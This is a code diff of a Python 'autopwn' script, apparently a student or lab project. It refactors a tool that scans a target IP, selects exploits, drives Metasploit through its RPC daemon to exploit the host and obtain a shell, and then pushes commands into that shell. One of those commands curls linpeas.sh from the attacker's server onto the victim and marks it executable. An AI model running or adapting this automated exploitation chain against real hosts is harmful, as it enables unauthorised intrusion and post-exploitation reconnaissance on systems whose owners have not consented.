@@ -8,6 +8,7 @@ from pymetasploit3.msfrpc import MsfRpcClient
 import time
 from logs import LOG
 import post.postexploit as postexploit
+import sys
 
 RED = "\033[1;31m"
 YELLOW = "\033[33m"
@@ -31,9 +32,6 @@ logfile = open("./logtest", "a+")
 LOG("Launched autopwn.", logfile, "inf")
 
 IP = "192.168.1.45"
-CMD = (
-    "./explookup.sh " + IP + " >> /dev/null"
-)  # Sortie standard dans /dev/null pour la lisibilité, à changer
 EXPLOIT_LIST = "./exploit_list"
 
 
@@ -62,10 +60,11 @@ def show_pwnguin():
     )
 
 
-def scanIp4Vulnerabilities(exploit_path=EXPLOIT_LIST, cmd=CMD, ip=IP) -> list:
+def scanIp4Vulnerabilities(exploit_path=EXPLOIT_LIST, ip=IP):
     """Scans IP loofing for vulnerabilities and output the
     related exploit list to be parsed (in json)
     """
+    cmd = "./explookup.sh " + ip + " >> /dev/null"
     scan = subprocess.run(cmd, shell=True)
     if scan:
         msg = "Launching scan over @" + ip + " cmd :" + cmd
@@ -89,9 +88,11 @@ def createExploitList(res=[]) -> list[str]:
         exploits += search["RESULTS_EXPLOIT"]
     LOG("Imported exploit_list", logfile, "log")
     if exploits:
-        titles = []
-        for k, pwn in enumerate(exploits):
-            titles.append([k, pwn["Title"]])
+        titles = [pwn["Title"] for pwn in exploits]
+        noDuplicattes = []
+        [noDuplicattes.append(i) for i in titles if not noDuplicattes.count(i)]
+        titles = noDuplicattes
+        titles = [[k, title] for k, title in enumerate(titles)]
     else:
         LOG("Error 2 : Parsing error.", logfile, "err")
         print("[X] Error 2 : Parsing error.")
@@ -108,16 +109,24 @@ def selectExploit(choice=0, titles=[]) -> str:
     return titles[int(choice)][1][:-12]
 
 
-def runMetasploit(reinit=False) -> MsfRpcClient:
+def runMetasploit(reinit=False, show=True) -> MsfRpcClient:
     """Launch metasploit instance and returns associated client
     It is also possible to reinit the db if reinit = True (must be root!!!)
     """
-    proc = subprocess.run("msfrpcd -P yourpassword", shell=True)
+    redirect = None
+    if not show:
+        redirect = subprocess.DEVNULL
+
+    proc = subprocess.run(
+        "msfrpcd -P yourpassword", shell=True, stdout=redirect, stderr=redirect
+    )
     time.sleep(5)
     LOG("Started process msfrpcd", logfile, "inf")
 
     if reinit:
-        proc = subprocess.run("echo yes | msfdb reinit", shell=True)  # if db problem
+        proc = subprocess.run(
+            "echo yes | msfdb reinit", shell=True, stdout=redirect, stderr=redirect
+        )  # if db problem
         LOG("Started process msfdb (arg reinit)", logfile, "inf")
 
     client = MsfRpcClient("yourpassword", ssl=True)
@@ -125,22 +134,22 @@ def runMetasploit(reinit=False) -> MsfRpcClient:
     return client
 
 
-def selectModules(client=None, attack="") -> list[str]:
+def searchModules(client: MsfRpcClient = None, attack="") -> list[dict]:
     modules = client.modules.search(attack)
-    modulus = []
-    for mod in modules:
-        modulus.append([mod["type"], mod["fullname"]])
 
     print("[~] Available modules :")
-    for k in range(len(modulus)):
-        pprint.pprint(str(k) + " : " + modulus[k][0] + " : " + modulus[k][1])
+    for k in range(len(modules)):
+        pprint.pprint(
+            str(k) + " : " + modules[k]["type"] + " : " + modules[k]["fullname"]
+        )
     LOG("Displayed modules", logfile, "log")
-    return modulus
+    return modules
 
 
+# TODO couper exploitVuln en 3 fonctions select exploit, select payload et exploitVuln
 def exploitVuln(client=None, modlist=[]) -> None:
     """Execute selected payload on the targeted"""
-    exploit = client.modules.use(modlist[0][0], modlist[0][1])
+    exploit = client.modules.use(modlist[0]["type"], modlist[0]["fullname"])
     print("[V] Selected payloads: ", exploit.info)
 
     print("Exploit options :")
@@ -189,7 +198,7 @@ def getShell(client=None, id="1"):
 def autopwn():
     show_pwnguin()
 
-    results = scanIp4Vulnerabilities(EXPLOIT_LIST, CMD, IP)
+    results = scanIp4Vulnerabilities(EXPLOIT_LIST, IP)
     (exploits, metaexploits) = createExploitList(results)
 
     print("[~] Generic exploits :")
@@ -222,7 +231,7 @@ def autopwn():
 
     print("Starting msfrpcd...")
     client = runMetasploit(False)
-    modlist = selectModules(client, attack)
+    modlist = searchModules(client, attack)
     exploitVuln(client, modlist)
 
     print(client.sessions.list)
@@ -240,8 +249,9 @@ def autopwn():
     print("[V] Pwn complete !!! ")
     return (shell, client, ipport)
 
- # ,
-    # "./linpeas.sh -o users_information,software_information"]
+
+# ,
+# "./linpeas.sh -o users_information,software_information"]
 
 # if shell:
 #     for command in sequence:
@@ -254,40 +264,42 @@ def autopwn():
 #         else:
 #             print("coucou")
 
+
 def sendCommands(shell, sequence=[]) -> int:
     """Automated interaction with shell on target"""
-    if (len(sequence) == 0):
+    if len(sequence) == 0:
         print("[X] Error 5 : Invalid sequence.")
         LOG("[X] Error 5 : Invalid sequence.", logfile, "err")
         return -5
-    
+
     # if (shell == None):
     #     print("[X] Error 6 : Invalid shell.")
     #     LOG("[X] Error 6 : Invalid shell.", logfile, "err")
     #     return -6
-    
+
     for command in sequence:
         print(command)
         shell.write(command)
-        time.sleep(5) # Todo : modifier le sleep
+        time.sleep(5)  # Todo : modifier le sleep
         print(shell.read())
     return 0
 
 
-
+if len(sys.argv) > 1:
+    IP = sys.argv[1]
 (shell, client, srv) = autopwn()
 
 sequence = [
-        "whoami",
-        "curl -s " + srv + "/post/vir/linpeas.sh -o linpeas.sh > /dev/null",
-        "pwd",
-        "chown root:root linpeas.sh",
-        "echo 0xcafedeadbeef",
-        "chmod +x linpeas.sh",
-        "echo matthislemechan"
-] 
+    "whoami",
+    "curl -s " + srv + "/post/vir/linpeas.sh -o linpeas.sh > /dev/null",
+    "pwd",
+    "chown root:root linpeas.sh",
+    "echo 0xcafedeadbeef",
+    "chmod +x linpeas.sh",
+    "echo matthislemechan",
+]
 
-lol = sendCommands(shell,sequence)
+lol = sendCommands(shell, sequence)
 
 LOG("END OF LOGS", logfile, "crit")
 logfile.close()
